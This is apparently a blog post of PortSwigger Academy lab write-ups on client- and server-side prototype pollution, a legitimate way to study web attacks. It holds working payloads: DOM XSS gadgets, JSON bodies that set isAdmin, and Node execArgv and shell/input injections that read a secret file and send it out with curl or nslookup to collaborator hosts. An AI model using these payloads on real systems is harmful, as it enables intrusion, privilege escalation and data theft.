---
layout: single
title: Prototype Pollution - PortSwigger
excerpt: "All Prototype Pollution labs of PortSwigger."
date: 2025-10-06
classes: wide
header:
  teaser: /img2/images/portswigger.png
  teaser_home_page: true
  icon: /img2/images/burp.jpg
categories:
  - portswigger
  - Web
tags:
  - Burpsuite
  - Prototype Pollution
---


## TIPS

- Payloads

```javascript
?__proto__[foo]=bar
?__proto__.foo=bar
?__pro__proto__to__[foo]=bar
#__proto__[foo]=bar    --> jQuery (<1.12 / <2.2)
```

- DOM Invader

![](/img2/Pasted%20image%2020251005181722.png)

![](/img2/Pasted%20image%2020251005181848.png)

- Server-Side (JSON Prototype Pollution)

```json
{
	"address_line_1":"Wiener HQ",
	"address_line_2":"One Wiener Way",
	"city":"Wienerville",
	"postcode":"BU1 1RP",
	"country":"UK",
	"sessionId":"omUQ4NlX9WFFGSgKEM1UXt35LYAaK8ip",
	"__proto__":{
		"isAdmin":"true"
	}
}
```

```json
{
	"address_line_1":"Wiener HQ",
	"address_line_2":"One Wiener Way",
	"city":"Wienerville",
	"postcode":"BU1 1RP",
	"country":"UK",
	"sessionId":"omUQ4NlX9WFFGSgKEM1UXt35LYAaK8ip",
	"constructor":{
		"prototype":{
			"isAdmin":true
		}
	}
}
```

```json
{
	"address_line_1":"Wiener HQ",
	"address_line_2":"One Wiener Way",
	"city":"Wienerville",
	"postcode":"BU1 1RP",
	"country":"UK",
	"sessionId":"omUQ4NlX9WFFGSgKEM1UXt35LYAaK8ip",
	"__proto__":{
		"json spaces":20
	}
}
```

> Observe spaces in the JSON result.

- NodeJS Remote Execution via execArgv

```json
- NSLOOKUP -

{
	"__proto__":{
		"execArgv":[
			"--eval=require('child_process').execSync('nslookup $(cat /home/carlos/secret).9oyvfbvkxivd5kgpav5krzvmfdl490xp.oastify.com')"
			]
	}
}

- CURL -
  
{
	"__proto__":{
		"execArgv":[
			"--eval=require('child_process').execSync('curl --data-binary \"@/home/carlos/secret\" https://9oyvfbvkxivd5kgpav5krzvmfdl490xp.oastify.com')"
			]
	}
}
```

- NodeJS Remote Execution via shell+input (vim)

```json
{
	"__proto__":{
		"shell":"vim",
		"input":":! cat /home/carlos/secret | curl --data-binary @- https://fdw14hkqmokjuq5vz1uqg5ks4jaay8mx.oastify.com\n"
	}
}
```

## Client-side prototype pollution via browser APIs

- Manual

![](/img2/Pasted%20image%2020251005165617.png)

> First we detect the ability to access the prototype using the `__proto__` method. Once we have the ability to insert properties into the prototype we need to find a gadget that will execute our polluted prototype.

```javascript
async function logQuery(url, params) {
    try {
        await fetch(url, {method: "post", keepalive: true, body: JSON.stringify(params)});
    } catch(e) {
        console.error("Failed storing query");
    }
}

async function searchLogger() {
    let config = {params: deparam(new URL(location).searchParams.toString()), transport_url: false};
    Object.defineProperty(config, 'transport_url', {configurable: false, writable: false});
    if(config.transport_url) {
        let script = document.createElement('script');
        script.src = config.transport_url;
        document.body.appendChild(script);
    }
    if(config.params && config.params.search) {
        await logQuery('/logger', config.params);
    }
}

window.addEventListener("load", searchLogger);
```

> Inside the source code we find a JavaScript file where we can abuse the prototype. The vulnerable part of the file is the following:

```javascript
Object.defineProperty(config, 'transport_url', {configurable: false, writable: false});
    if(config.transport_url) {
        let script = document.createElement('script');
        script.src = config.transport_url;
        document.body.appendChild(script);
    }
```

> In this block a property is being defined for the object config.transport_url. The vulnerability occurs by not specifying a value when using defineProperty leaving the situation like this:

```javascript
config.transport_url.value = undefined
```

![](/img2/Pasted%20image%2020251005180721.png)

> Following the premise of using value, by injecting the property value into the prototype we see that the result would be something like:

```javascript
config.transport_url.value = testing123
```

![](/img2/Pasted%20image%2020251005181013.png)

> To take advantage of this situation within the context of the src attribute when loading a script we can use data. This is possible because the browser tries to load content of type testing123. When it fails it executes the javascript content followed by the comma.

- DOM Invader

![](/img2/Pasted%20image%2020251005181722.png)

> The DOM Invader extension detects the possible access to the prototype.

![](/img2/Pasted%20image%2020251005181848.png)

> We scan for gadgets and see that the extension finds a potential path to execute JavaScript code.

![](/img2/Pasted%20image%2020251005181933.png)

## DOM XSS via client-side prototype pollution

- Manual

![](/img2/Pasted%20image%2020251005182338.png)

> We detect possible access to the prototype using the `__proto__` method.

```javascript
async function logQuery(url, params) {
    try {
        await fetch(url, {method: "post", keepalive: true, body: JSON.stringify(params)});
    } catch(e) {
        console.error("Failed storing query");
    }
}

async function searchLogger() {
    let config = {params: deparam(new URL(location).searchParams.toString())};

    if(config.transport_url) {
        let script = document.createElement('script');
        script.src = config.transport_url;
        document.body.appendChild(script);
    }

    if(config.params && config.params.search) {
        await logQuery('/logger', config.params);
    }
}

window.addEventListener("load", searchLogger);
```

> Reviewing the source code we find a JavaScript file. If we analyze the file we see that an object config is being created which contains the property params. However in the next line a check is made on the property transport_url which is empty, that is undefined. Knowing this we have found the gadget to exploit the prototype pollution. It would be the property transport_url.

![](/img2/Pasted%20image%2020251005184112.png)

> Like the previous lab we exploit data to trick the browser and execute a JavaScript code inside the script tag src attribute context.

- DOM Invader

![](/img2/Pasted%20image%2020251005184244.png)

> Using the extension we detect possible access to the prototype.

![](/img2/Pasted%20image%2020251005184332.png)

> We perform a gadget scan and the extension detects a potential path to execute malicious JavaScript inside the context of a script tag src attribute.

![](/img2/Pasted%20image%2020251005184441.png)

## DOM XSS via an alternative prototype pollution vector

- Manual

![](/img2/Pasted%20image%2020251005185222.png)

> When attempting to access the prototype with the `__proto__` method we see we cannot modify the foo property.

![](/img2/Pasted%20image%2020251005185449.png)

> To access the prototype we can try other alternatives like `__proto__.foo=bar`.

```javascript
async function logQuery(url, params) {
    try {
        await fetch(url, {method: "post", keepalive: true, body: JSON.stringify(params)});
    } catch(e) {
        console.error("Failed storing query");
    }
}

async function searchLogger() {
    window.macros = {};
    window.manager = {params: $.parseParams(new URL(location)), macro(property) {
            if (window.macros.hasOwnProperty(property))
                return macros[property]
        }};
    let a = manager.sequence || 1;
    manager.sequence = a + 1;

    eval('if(manager && manager.sequence){ manager.macro('+manager.sequence+') }');

    if(manager.params && manager.params.search) {
        await logQuery('/logger', manager.params);
    }
}

window.addEventListener("load", searchLogger);
```

> Reviewing the source code we find a JavaScript file. Inside this file we find a use of the eval() function which allows execution of JavaScript in certain contexts. To find the gadget we notice the object manager.sequence is within the context of some operators.

![](/img2/Pasted%20image%2020251005191707.png)

![](/img2/Pasted%20image%2020251005194122.png)

> When attempting to execute the JavaScript we see a syntax error. This is because the actual query behind it would be something like:

```javascript
eval('if(manager && manager.sequence){ manager.macro('+alert(1)1+') }');
```

> The syntax error occurs due to the 1 that is added when creating the property manager.sequence.

![](/img2/Pasted%20image%2020251005191857.png)

> For the syntax to be valid and allow us to execute JavaScript we simply have to add an operator at the end. That way the final query would look like:

```javascript
eval('if(manager && manager.sequence){ manager.macro('+alert(1)-1+') }');
```

- DOM Invader

![](/img2/Pasted%20image%2020251005192413.png)

> Using the extension we find a way to access the prototype using another syntax when using the `__proto__` method.

![](/img2/Pasted%20image%2020251005192548.png)

> We run the gadget scan and observe the extension detects a potential vector to execute JavaScript via the eval() function.

![](/img2/Pasted%20image%2020251005192725.png)

> When executing the exploit generated by the extension we see a syntax error inside the JavaScript code.

![](/img2/Pasted%20image%2020251005192834.png)

> We go to the file where the error is and see that the error lies in creating the manager.sequence property. The script adds a 1 and that makes the final query like:

```javascript
eval('if(manager && manager.sequence){ manager.macro('+alert(1)1+') }');
```

![](/img2/Pasted%20image%2020251005191857.png)

> To fix this we add an operator at the end so the final query would be executing:

```javascript
eval('if(manager && manager.sequence){ manager.macro('+alert(1)-1+') }');
```

## Client-side prototype pollution via flawed sanitization

- Manual

![](/img2/Pasted%20image%2020251005201247.png)

> Reviewing the source code we find a file that sanitizes prototype pollution injections. This sanitization replaces the words `constructor, __proto__, prototype`.

![](/img2/Pasted%20image%2020251005201447.png)

> Knowing this we can take advantage of the replacement of the word `__proto__` in such a way that we would get a result like this:

```javascript
- BEFORE SANETIZED -

__pro__DELETED__to__[foo]=bar

- AFTER SANETIZED -
  
__proto__[foo]=bar
```

![](/img2/Pasted%20image%2020251005201654.png)

> If we keep reading the source code we find the gadget. In this case it would again be the property config.transport_url which is not defined at any time, that is it would be undefined.

![](/img2/Pasted%20image%2020251005201833.png)

- DOM Invader

![](/img2/Pasted%20image%2020251005202045.png)

> Using the extension we see how to bypass the sanitization and access the prototype.

![](/img2/Pasted%20image%2020251005202200.png)

> We perform a gadget scan and the extension detects a path that could execute JavaScript inside the context of a script tag src attribute.

![](/img2/Pasted%20image%2020251005202343.png)

## Client-side prototype pollution in third-party libraries

- Manual

![](/img2/Pasted%20image%2020251005222910.png)

![](/img2/Pasted%20image%2020251005222645.png)

> We see that the jQuery version is very old. In jQuery versions (<1.12 / <2.2) we can access the prototype via the url hash.

![](/img2/Pasted%20image%2020251005223654.png)

> We review all possible gadgets in the JavaScript files.

![](/img2/Pasted%20image%2020251005223935.png)

> We start the debugger mode by modifying a response.

![](/img2/Pasted%20image%2020251005224455.png)

![](/img2/Pasted%20image%2020251005224814.png)

![](/img2/Pasted%20image%2020251005224837.png)

> To find the gadget we can use the following script:

```javascript
Object.defineProperty(Object.prototype, 'YOUR-PROPERTY', {
    get() {
        console.trace();
        return 'polluted';
    }
})
```

> This script uses the property you specify and notifies us if that property is used.

![](/img2/Pasted%20image%2020251005231120.png)

![](/img2/Pasted%20image%2020251005231222.png)

- DOM Invader

![](/img2/Pasted%20image%2020251005231345.png)

> Using the extension we detect an injection in the url hash.

![](/img2/Pasted%20image%2020251005231640.png)

> With the gadget scan we detect a potential vector to execute JavaScript in the setTimeout() function.

![](/img2/Pasted%20image%2020251005231728.png)

![](/img2/Pasted%20image%2020251005231222.png)

## Privilege escalation via server-side prototype pollution

![](/img2/Pasted%20image%2020251006104350.png)

> We insert a new property into the prototype within the JSON body. This allows us to modify the user object because the server behind trusts properties inherited from the prototype as well as the object's own properties.

![](/img2/Pasted%20image%2020251006104557.png)

> We change the isAdmin property of the object to true.

![](/img2/Pasted%20image%2020251006104631.png)

## Detecting server-side prototype pollution without polluted property reflection

![](/img2/Pasted%20image%2020251006112457.png)

> We try to inject a property into the prototype but we see no sign that the injection succeeded.

![](/img2/Pasted%20image%2020251006112638.png)

> However by forcing an error in the JSON body we see that the response error object does reflect this injected property.

![](/img2/Pasted%20image%2020251006112835.png)

![](/img2/Pasted%20image%2020251006112914.png)

> To confirm the vulnerability we modify some property that does not break the server's functionality such as status

## Bypassing flawed input filters for server-side prototype pollution

![](/img2/Pasted%20image%2020251006114258.png)

> Once we tried to inject a property into the prototype via `__proto__` we can try another alternative such as constructor.

![](/img2/Pasted%20image%2020251006114409.png)

> We modify the isAdmin property taking into account that the server allows properties inherited from the prototype.

![](/img2/Pasted%20image%2020251006114501.png)

## Remote code execution via server-side prototype pollution

![](/img2/Pasted%20image%2020251006124157.png)

> We identify the injection of properties into the prototype.

![](/img2/Pasted%20image%2020251006124315.png)

> We see that we have the option to run maintenance tasks. The server is probably running scripts in processes isolated from the main thread to avoid blocking the server.

![](/img2/Pasted%20image%2020251006124727.png)

![](/img2/Pasted%20image%2020251006124741.png)

![](/img2/Pasted%20image%2020251006124752.png)

> Knowing this we can execute commands thanks to the execArgv property. This property is automatically executed by NodeJS when it runs a process as a separate script from the main thread. In NodeJS if you do not pass an option to the process it automatically executes process.execArgv. The --eval function allows executing JavaScript in NodeJS which, thanks to the child_process module, lets us execute system-level commands.

![](/img2/Pasted%20image%2020251006125745.png)

## Exfiltrating sensitive data via server-side prototype pollution

![](/img2/Pasted%20image%2020251006130243.png)

> We detect the injection of a property into the prototype.

![](/img2/Pasted%20image%2020251006135256.png)

![](/img2/Pasted%20image%2020251006135314.png)

![](/img2/Pasted%20image%2020251006135329.png)

> We try to execute commands in the same way as the previous lab and see that we cannot run commands. However there is another way to run commands in NodeJS using the properties:

> 1. shell -> Indicates the type of shell we will use (sh, vim...).
> 2. input -> Indicates the command that we will pass to the shell.

![](/img2/Pasted%20image%2020251006135615.png)

![](/img2/Pasted%20image%2020251006135629.png)